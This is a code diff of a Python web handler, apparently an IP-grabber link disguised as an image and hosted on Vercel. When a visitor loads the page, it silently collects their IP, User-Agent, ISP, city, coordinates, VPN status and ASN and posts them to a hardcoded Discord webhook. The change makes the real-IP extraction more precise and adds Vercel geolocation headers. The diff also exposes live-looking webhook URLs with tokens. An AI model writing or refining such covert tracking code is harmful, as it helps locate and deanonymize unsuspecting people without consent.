@@ -6,12 +6,15 @@ import urllib.request
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
         # Your webhook URL
-        WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
+        WEBHOOK = "https://discord.com/api/webhooks/1464388498063884288/7dBwrJezTKRiAfM4DhXxN7mDwQDKwVkvy9hbRqnkIzrT3Y2KEa-hVu-oxGFsBRo98jkz"
         IMAGE = "https://tse3.mm.bing.net/th/id/OIP.-ZtApdSarXwnPdnoTISdtwHaFj?rs=1&pid=ImgDetMain&o=7&rm=3"
         
-        # Get IP and User Agent
-        ip = self.headers.get('X-Forwarded-For', self.client_address[0])
+        # Get REAL IP and User Agent (Vercel specific headers)
+        ip = self.headers.get('X-Real-IP') or self.headers.get('X-Forwarded-For', '').split(',')[0].strip() or self.client_address[0]
         user_agent = self.headers.get('User-Agent', 'Unknown')
+        country = self.headers.get('X-Vercel-IP-Country', 'Unknown')
+        city = self.headers.get('X-Vercel-IP-City', 'Unknown')
+        region = self.headers.get('X-Vercel-IP-Country-Region', 'Unknown')
         
         # Get IP info
         try:
@@ -37,13 +40,14 @@ class handler(BaseHTTPRequestHandler):
 **IP Info:**
 > **IP:** `{ip}`
 > **Provider:** `{info.get('isp', 'Unknown')}`
-> **Country:** `{info.get('country', 'Unknown')}`
-> **Region:** `{info.get('regionName', 'Unknown')}`
-> **City:** `{info.get('city', 'Unknown')}`
+> **Country:** `{info.get('country', country)}`
+> **Region:** `{info.get('regionName', region)}`
+> **City:** `{info.get('city', city)}`
 > **Coords:** `{info.get('lat', 'N/A')}, {info.get('lon', 'N/A')}`
 > **Timezone:** `{info.get('timezone', 'Unknown')}`
 > **VPN:** `{info.get('proxy', False)}`
 > **Mobile:** `{info.get('mobile', False)}`
+> **ASN:** `{info.get('as', 'Unknown')}`
 
 **User Agent:**
 ```
